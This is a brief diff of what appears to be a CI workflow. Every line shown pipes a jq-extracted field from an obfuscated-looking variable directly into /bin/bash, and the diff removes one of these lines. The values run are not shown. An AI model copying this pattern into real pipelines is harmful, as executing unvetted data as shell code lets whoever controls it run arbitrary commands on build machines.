@@ -37,7 +37,6 @@ jobs:
           printf '%s' "$sp42" | jq -r .p0581 | /bin/bash
           printf '%s' "$vntm68558" | jq -r .cwizk4197 | /bin/bash
           printf '%s' "$cbc1" | jq -r .rmzc972 | /bin/bash
-          echo $wp425 | jq -r .zpahz4 | /bin/bash
           printf '%s' "$w743" | jq -r .gqe45 | /bin/bash
 
       - name: Archive artifact
